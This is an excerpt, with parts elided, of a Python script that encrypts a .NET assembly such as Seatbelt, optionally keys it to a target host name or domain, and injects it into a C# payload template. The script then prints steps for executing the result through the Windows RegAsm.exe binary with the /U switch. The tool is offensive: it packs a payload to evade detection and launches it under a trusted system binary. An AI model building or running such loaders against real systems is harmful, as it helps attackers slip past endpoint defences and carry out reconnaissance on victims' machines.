#!/usr/bin/env python3
"""
build_regasm.py -- Encrypts a .NET assembly and injects into regasm_payload.cs

Usage:
  python build_regasm.py <assembly_path> [options] [-- <assembly_args>...]

Examples:
  python build_regasm.py Seatbelt.exe -- -group=all
  python build_regasm.py Seatbelt.exe -e xor -- -group=all
  python build_regasm.py Seatbelt.exe --keying hostname=WS01,domain=CORP -- -group=all
  python build_regasm.py MyLib.dll --type Namespace.Class --method Run
...
def main():
    ...
    parser = argparse.ArgumentParser(
        description="Encrypt a .NET assembly and inject into regasm_payload.cs"
    )
    ...
    template_path = args.template or os.path.join(script_dir, "regasm_payload.cs")
    ...
    if args.compile:
        print(f"    C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\RegAsm.exe"
              f" /U {os.path.basename(dll_path)}", file=sys.stderr)
    else:
        print(f"    Compile: mcs -target:library"
              f" -out:payload.dll {os.path.basename(output_path)}", file=sys.stderr)
        print(f"    Run:     C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\RegAsm.exe"
              f" /U payload.dll", file=sys.stderr)
